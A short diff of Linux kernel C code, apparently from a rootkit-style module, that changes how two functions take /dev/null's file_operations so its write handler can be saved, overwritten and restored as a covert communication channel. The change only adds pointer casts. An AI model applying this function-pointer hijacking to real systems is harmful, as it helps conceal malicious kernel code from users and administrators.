@@ -26,7 +26,7 @@ int establish_comm_channel() {
   }
 
   struct file_operations *dev_null_fop;
-  dev_null_fop = dev_null_file->f_op;
+  dev_null_fop = (struct file_operations *) dev_null_file->f_op;
   filp_close(dev_null_file, 0);
 
   original_dev_null_write = dev_null_fop->write;
@@ -44,7 +44,7 @@ int unestablish_comm_channel() {
   }
 
   struct file_operations *dev_null_fop;
-  dev_null_fop = dev_null_file->f_op;
+  dev_null_fop = (struct file_operations *) dev_null_file->f_op;
   filp_close(dev_null_file, 0);
 
   dev_null_fop->write = original_dev_null_write;
